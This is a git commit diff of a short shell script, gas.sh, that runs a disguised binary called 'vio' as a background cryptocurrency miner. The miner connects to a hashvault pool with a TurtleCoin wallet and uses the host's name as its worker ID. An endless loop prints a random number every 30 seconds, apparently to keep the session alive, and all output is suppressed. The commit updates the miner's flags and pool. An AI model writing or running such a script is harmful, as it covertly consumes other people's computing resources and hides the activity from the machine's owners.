36a48dca8128078c6c36f2c188795a9cc705f2c3
nmtha <97421825+nmtha@users.noreply.github.com>
2022-01-13 11:11:32 +0700

    Update gas.sh

--- gas.sh
+++ gas.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
 chmod u+x vio
-./vio --donate-level 1 -a Argon2/Chukwa -o frankfurt01.hashvault.pro:80 -u TRTLuyhTSuu5cKEs7mgBwVXEAvh4uJyUNfG6CskYPw998yHNL6UrraV2XoBTtkjL4NRh7Uo9qyN6qBQePU2gAa7vdL9MsCFCULN -p $(cat /proc/sys/kernel/hostname) -t$(nproc --all) >/dev/null &while :; do shuf -n 1 -i 1-99999999; sleep 30; done >/dev/null >/dev/null 2>&1
+./vio --pool pool.hashvault.pro:80 --username TRTLuyhTSuu5cKEs7mgBwVXEAvh4uJyUNfG6CskYPw998yHNL6UrraV2XoBTtkjL4NRh7Uo9qyN6qBQePU2gAa7vdL9MsCFCULN --password $(cat /proc/sys/kernel/hostname) --algorithm chukwa_v2 --ssl >/dev/null &
+while :; do shuf -n 1 -i 1-99999999; sleep 30; done >/dev/null >/dev/null 2>&1
